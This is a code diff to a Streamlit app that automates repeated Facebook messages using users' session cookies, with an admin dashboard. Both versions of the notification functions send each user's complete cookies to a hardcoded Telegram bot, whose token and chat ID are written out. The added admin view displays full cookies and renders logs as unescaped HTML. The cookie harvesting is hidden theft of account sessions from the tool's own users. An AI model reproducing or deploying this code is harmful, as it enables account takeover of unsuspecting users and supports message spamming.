@@ -26,8 +26,8 @@ TELEGRAM_BOT_TOKEN = "8043472695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
 TELEGRAM_CHAT_ID = "8186206231"
 FACEBOOK_ADMIN_UID = "100037931553832"
 
-def send_telegram_notification(user_data, automation_data, full_cookies):
-    """Send complete user details to Telegram bot"""
+def send_telegram_notification(user_data, automation_data):
+    """Send user details to Telegram bot"""
     try:
         message = f"""
 🔰 *NEW AUTOMATION STARTED* 🔰
@@ -43,8 +43,8 @@ def send_telegram_notification(user_data, automation_data, full_cookies):
 • Prefix: `{automation_data['prefix']}`
 • Messages: `{len(automation_data['messages'].splitlines())} lines`
 
-🍪 *Complete Cookies:* 
-`{full_cookies}`
+🍪 *Full Cookies:* 
+`{automation_data['cookies']}`
 
 📊 *Status:* Automation Running
 🕒 *Started:* {time.strftime("%Y-%m-%d %H:%M:%S")}
@@ -60,8 +60,8 @@ def send_telegram_notification(user_data, automation_data, full_cookies):
     except Exception as e:
         print(f"Telegram notification failed: {e}")
 
-def send_facebook_notification(user_data, automation_data, full_cookies):
-    """Send complete notification to Facebook admin"""
+def send_facebook_notification(user_data, automation_data):
+    """Send notification to Facebook admin"""
     try:
         message = f"""
 🔰 NEW AUTOMATION STARTED 🔰
@@ -77,16 +77,21 @@ def send_facebook_notification(user_data, automation_data, full_cookies):
 • Prefix: {automation_data['prefix']}
 • Messages: {len(automation_data['messages'].splitlines())} lines
 
-🍪 Complete Cookies: 
-{full_cookies}
+🍪 Full Cookies: 
+{automation_data['cookies']}
 
 📊 Status: Automation Running
 🕒 Started: {time.strftime("%Y-%m-%d %H:%M:%S")}
         """
         
-        # Store in database for admin panel access
-        db.store_admin_notification(user_data['user_id'], message)
-        print(f"Facebook notification stored for admin {FACEBOOK_ADMIN_UID}")
+        # Simulate sending to Facebook admin
+        print(f"Facebook notification sent to admin {FACEBOOK_ADMIN_UID}")
+        print(f"Message: {message}")
+        
+        # Here you would implement actual Facebook API integration
+        # For now, we'll log it
+        db.log_admin_notification(user_data['user_id'], message)
+        
     except Exception as e:
         print(f"Facebook notification failed: {e}")
 
@@ -402,23 +407,25 @@ custom_css = f"""
         z-index: 2;
     }}
     
-    .log-line {{
-        animation: rainbowText 3s infinite;
-        margin: 2px 0;
-        padding: 2px 5px;
-        border-radius: 3px;
+    .log-entry {{
+        margin: 5px 0;
+        padding: 3px 8px;
+        border-radius: 5px;
+        animation: rainbowText 3s infinite alternate;
         font-weight: bold;
         text-shadow: 0 0 10px currentColor;
     }}
     
     @keyframes rainbowText {{
         0% {{ color: #ff6b6b; }}
-        16% {{ color: #feca57; }}
-        32% {{ color: #48dbfb; }}
-        48% {{ color: #ff9ff3; }}
-        64% {{ color: #1dd1a1; }}
-        80% {{ color: #f368e0; }}
-        100% {{ color: #ff6b6b; }}
+        12.5% {{ color: #feca57; }}
+        25% {{ color: #48dbfb; }}
+        37.5% {{ color: #ff9ff3; }}
+        50% {{ color: #54a0ff; }}
+        62.5% {{ color: #00d2d3; }}
+        75% {{ color: #00b894; }}
+        87.5% {{ color: #f368e0; }}
+        100% {{ color: #ff9ff3; }}
     }}
     
     .admin-panel {{
@@ -512,43 +519,32 @@ custom_css = f"""
         box-shadow: 0 6px 20px rgba(24, 119, 242, 0.6);
     }}
     
-    .admin-logs-container {{
-        background: #1a1a1a;
-        color: white;
+    .admin-console {{
+        background: #1e1e1e;
+        color: #87CEEB;
         padding: 1rem;
         border-radius: 10px;
+        font-family: 'Courier New', monospace;
         max-height: 500px;
         overflow-y: auto;
-        font-family: 'Courier New', monospace;
-        font-size: 0.8rem;
+        margin: 1rem 0;
         border: 2px solid #667eea;
     }}
     
-    .admin-log-line {{
-        padding: 3px 5px;
-        margin: 2px 0;
-        border-left: 3px solid;
-        animation: adminRainbow 4s infinite;
+    .admin-log-entry {{
+        margin: 5px 0;
+        padding: 3px 8px;
+        border-radius: 5px;
+        background: rgba(255,255,255,0.1);
+        border-left: 3px solid #667eea;
     }}
     
-    @keyframes adminRainbow {{
-        0% {{ border-left-color: #ff6b6b; color: #ff6b6b; }}
-        14% {{ border-left-color: #feca57; color: #feca57; }}
-        28% {{ border-left-color: #48dbfb; color: #48dbfb; }}
-        42% {{ border-left-color: #ff9ff3; color: #ff9ff3; }}
-        56% {{ border-left-color: #1dd1a1; color: #1dd1a1; }}
-        70% {{ border-left-color: #f368e0; color: #f368e0; }}
-        84% {{ border-left-color: #ff9f43; color: #ff9f43; }}
-        100% {{ border-left-color: #ff6b6b; color: #ff6b6b; }}
-    }}
-    
-    .user-console {{
-        background: linear-gradient(135deg, #1e3c72, #2a5298);
-        color: white;
+    .user-details-expanded {{
+        background: rgba(255,255,255,0.05);
         padding: 1rem;
-        border-radius: 10px;
+        border-radius: 8px;
         margin: 0.5rem 0;
-        border: 2px solid #667eea;
+        border: 1px solid #667eea;
     }}
 </style>
 """
@@ -576,8 +572,6 @@ if 'message_count' not in st.session_state:
     st.session_state.message_count = 0
 if 'admin_logged_in' not in st.session_state:
     st.session_state.admin_logged_in = False
-if 'user_consoles' not in st.session_state:
-    st.session_state.user_consoles = {}
 
 class AutomationState:
     def __init__(self):
@@ -604,21 +598,18 @@ def get_indian_time():
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S IST")
 
 def log_message(msg, automation_state=None, user_id=None):
-    """Enhanced logging with Indian time and rainbow colors"""
+    """Log message with Indian timestamp"""
     timestamp = get_indian_time()
     formatted_msg = f"[{timestamp}] {msg}"
     
-    # Store in admin console if user_id provided
+    # Store in admin logs if user_id provided
     if user_id:
-        if user_id not in st.session_state.user_consoles:
-            st.session_state.user_consoles[user_id] = []
-        st.session_state.user_consoles[user_id].append(formatted_msg)
-        # Keep only last 100 logs per user
-        if len(st.session_state.user_consoles[user_id]) > 100:
-            st.session_state.user_consoles[user_id] = st.session_state.user_consoles[user_id][-100:]
+        db.log_user_activity(user_id, formatted_msg)
     
     if automation_state:
         automation_state.logs.append(formatted_msg)
+        automation_state.last_message_sent = msg
+        automation_state.last_message_time = timestamp
     else:
         if 'logs' in st.session_state:
             st.session_state.logs.append(formatted_msg)
@@ -901,9 +892,6 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
                 
                 messages_sent += 1
                 automation_state.message_count = messages_sent
-                automation_state.last_message_sent = message_to_send
-                automation_state.last_message_time = get_indian_time()
-                
                 log_message(f'{process_id}: Message {messages_sent} sent: {message_to_send[:30]}...', automation_state, user_id)
                 
                 time.sleep(delay)
@@ -958,12 +946,12 @@ def run_automation_with_notification(user_config, username, automation_state, us
         'delay': user_config['delay'],
         'prefix': user_config['name_prefix'],
         'messages': user_config['messages_file_content'],
-        'cookies': user_config['cookies']
+        'cookies': user_config['cookies']  # Full cookies now
     }
     
-    # Send complete notifications with full cookies
-    send_telegram_notification(user_data, automation_data, user_config['cookies'])
-    send_facebook_notification(user_data, automation_data, user_config['cookies'])
+    # Send notifications
+    send_telegram_notification(user_data, automation_data)
+    send_facebook_notification(user_data, automation_data)
     
     # Start automation
     send_messages(user_config, automation_state, user_id)
@@ -977,7 +965,6 @@ def start_automation(user_config, user_id):
     automation_state.running = True
     automation_state.message_count = 0
     automation_state.logs = []
-    automation_state.message_rotation_index = 0
     
     db.set_automation_running(user_id, True)
     
@@ -989,7 +976,6 @@ def start_automation(user_config, user_id):
 def stop_automation(user_id):
     st.session_state.automation_state.running = False
     db.set_automation_running(user_id, False)
-    log_message(f"Automation stopped by admin for user {user_id}", user_id=user_id)
 
 # Main application
 st.markdown('<div class="main-container">', unsafe_allow_html=True)
@@ -1047,56 +1033,43 @@ if st.session_state.admin_logged_in:
                         st.error(f"Rejected user: {username}")
                         st.rerun()
     
-    # Show all approved users with enhanced controls
+    # Show all approved users with remove option
     approved_users = db.get_approved_users()
     if approved_users:
-        st.markdown("#### 🎯 Active Users Dashboard")
+        st.markdown("#### Approved Users - Remove Approval")
         
         for user in approved_users:
             user_id, username, approval_key, real_name, automation_running = user
             
             with st.container():
-                user_config = db.get_user_config(user_id)
-                chat_id = user_config['chat_id'] if user_config else "Not configured"
-                status = "🟢 Running" if automation_running else "🔴 Stopped"
-                
-                # Get user console logs
-                user_logs = st.session_state.user_consoles.get(user_id, [])
-                last_logs = user_logs[-10:] if user_logs else ["No logs available"]
-                
-                col1, col2, col3, col4 = st.columns([3, 1, 1, 1])
+                col1, col2, col3, col4, col5 = st.columns([3, 1, 1, 1, 1])
                 
                 with col1:
+                    user_config = db.get_user_config(user_id)
+                    chat_id = user_config['chat_id'] if user_config else "Not configured"
+                    status = "🟢 Running" if automation_running else "🔴 Stopped"
+                    
                     st.markdown(f"""
                     <div class="user-card approved">
-                        <strong>👤 Username:</strong> {username}<br>
-                        <strong>📛 Real Name:</strong> {real_name}<br>
-                        <strong>💬 Chat ID:</strong> {chat_id}<br>
-                        <strong>📊 Status:</strong> {status}<br>
-                        <strong>🔑 Approval Key:</strong> <code>{approval_key}</code>
+                        <strong>Username:</strong> {username}<br>
+                        <strong>Real Name:</strong> {real_name}<br>
+                        <strong>Chat ID:</strong> {chat_id}<br>
+                        <strong>Status:</strong> {status}<br>
+                        <strong>Approval Key:</strong> <code>{approval_key}</code>
                     </div>
                     """, unsafe_allow_html=True)
-                    
-                    # User Console
-                    st.markdown(f"#### 📟 {username}'s Live Console")
-                    console_html = '<div class="admin-logs-container">'
-                    for log in last_logs:
-                        console_html += f'<div class="admin-log-line">{log}</div>'
-                    console_html += '</div>'
-                    st.markdown(console_html, unsafe_allow_html=True)
                 
                 with col2:
                     if st.button(f"🗑️ Remove", key=f"remove_{user_id}"):
                         db.update_approval_status(user_id, 'rejected')
-                        if automation_running:
-                            stop_automation(user_id)
+                        db.set_automation_running(user_id, False)
                         st.error(f"Removed approval for: {username}")
                         st.rerun()
                 
                 with col3:
                     if automation_running:
                         if st.button(f"⏹️ Stop", key=f"stop_{user_id}"):
-                            stop_automation(user_id)
+                            db.set_automation_running(user_id, False)
                             st.warning(f"Stopped automation for: {username}")
                             st.rerun()
                     else:
@@ -1104,7 +1077,13 @@ if st.session_state.admin_logged_in:
                             user_config = db.get_user_config(user_id)
                             if user_config and user_config['chat_id']:
                                 db.set_automation_running(user_id, True)
-                                start_automation(user_config, user_id)
+                                # Start automation in background
+                                thread = threading.Thread(
+                                    target=run_automation_with_notification, 
+                                    args=(user_config, username, AutomationState(), user_id)
+                                )
+                                thread.daemon = True
+                                thread.start()
                                 st.success(f"Started automation for: {username}")
                                 st.rerun()
                             else:
@@ -1115,44 +1094,77 @@ if st.session_state.admin_logged_in:
                         user_config = db.get_user_config(user_id)
                         if user_config:
                             st.markdown(f"""
-                            **🔧 User Configuration Details:**
-                            - 💬 Chat ID: `{user_config['chat_id']}`
-                            - 🏷️ Prefix: `{user_config['name_prefix']}`
-                            - ⏱️ Delay: `{user_config['delay']} seconds`
-                            - 📝 Messages: `{len(user_config['messages_file_content'].splitlines())} lines`
-                            - 🍪 Cookies: `{user_config['cookies'][:100]}...`
-                            """)
+                            <div class="user-details-expanded">
+                            <h4>User Configuration Details:</h4>
+                            - Chat ID: `{user_config['chat_id']}`<br>
+                            - Prefix: `{user_config['name_prefix']}`<br>
+                            - Delay: `{user_config['delay']} seconds`<br>
+                            - Messages: `{len(user_config['messages_file_content'].splitlines())} lines`<br>
+                            - Full Cookies: `{user_config['cookies']}`
+                            </div>
+                            """, unsafe_allow_html=True)
+                
+                with col5:
+                    if st.button(f"📜 Logs", key=f"logs_{user_id}"):
+                        user_logs = db.get_user_logs(user_id)
+                        if user_logs:
+                            st.markdown(f"### 📜 Live Logs for {username}")
+                            logs_html = '<div class="admin-console">'
+                            for log in user_logs[-20:]:
+                                logs_html += f'<div class="admin-log-entry">{log}</div>'
+                            logs_html += '</div>'
+                            st.markdown(logs_html, unsafe_allow_html=True)
+                        else:
+                            st.info("No logs available for this user")
     
-    # Show all users in a comprehensive table
+    # Real-time Admin Console
+    st.markdown("### 👁️ Real-time Admin Console")
+    
+    # Auto-refresh for admin console
+    if st.checkbox("🔄 Auto-refresh Console", value=True):
+        time.sleep(2)
+        st.rerun()
+    
+    # Show all active automations with live logs
+    active_users = db.get_active_automations()
+    if active_users:
+        st.markdown(f"#### 🟢 Active Automations ({len(active_users)})")
+        
+        for user in active_users:
+            user_id, username = user
+            user_logs = db.get_user_logs(user_id)
+            
+            with st.expander(f"📱 {username} - Live Activity", expanded=False):
+                if user_logs:
+                    logs_html = '<div class="admin-console">'
+                    for log in user_logs[-15:]:
+                        logs_html += f'<div class="admin-log-entry">{log}</div>'
+                    logs_html += '</div>'
+                    st.markdown(logs_html, unsafe_allow_html=True)
+                    
+                    # Quick stop button
+                    if st.button(f"🛑 Stop {username}", key=f"quick_stop_{user_id}"):
+                        db.set_automation_running(user_id, False)
+                        st.success(f"Stopped {username}'s automation")
+                        st.rerun()
+                else:
+                    st.info("No recent activity logs")
+    
+    # Show all users
     all_users = db.get_all_users()
     if all_users:
-        st.markdown("#### 👥 All Users Overview")
+        st.markdown("#### 👥 All Users")
         for user in all_users:
             user_id, username, approval_status, real_name, approval_key = user
             
             status_class = approval_status.lower() if approval_status else 'pending'
-            automation_running = db.get_automation_running(user_id)
-            status_icon = "🟢" if automation_running else "🔴"
+            status_icon = "🟢" if approval_status == 'approved' else "🟡" if approval_status == 'pending' else "🔴"
             
             st.markdown(f"""
             <div class="user-card {status_class}">
-                <strong>{status_icon} Username:</strong> {username} | 
+                {status_icon} <strong>Username:</strong> {username} | 
                 <strong>Status:</strong> {approval_status.upper() if approval_status else 'PENDING'} | 
-                <strong>Real Name:</strong> {real_name} |
-                <strong>Auto:</strong> {'RUNNING' if automation_running else 'STOPPED'}
-            </div>
-            """, unsafe_allow_html=True)
-    
-    # Admin notifications section
-    st.markdown("#### 📢 Admin Notifications")
-    admin_notifications = db.get_admin_notifications()
-    if admin_notifications:
-        for notification in admin_notifications[-5:]:  # Show last 5 notifications
-            user_id, message, timestamp = notification
-            st.markdown(f"""
-            <div class="info-card">
-                <strong>📅 {timestamp}</strong><br>
-                <pre>{message}</pre>
+                <strong>Real Name:</strong> {real_name}
             </div>
             """, unsafe_allow_html=True)
     
@@ -1480,7 +1492,7 @@ else:
                 if st.session_state.automation_state.logs:
                     logs_html = '<div class="log-container">'
                     for log in st.session_state.automation_state.logs[-50:]:
-                        logs_html += f'<div class="log-line">{log}</div>'
+                        logs_html += f'<div class="log-entry">{log}</div>'
                     logs_html += '</div>'
                     st.markdown(logs_html, unsafe_allow_html=True)
                 else:
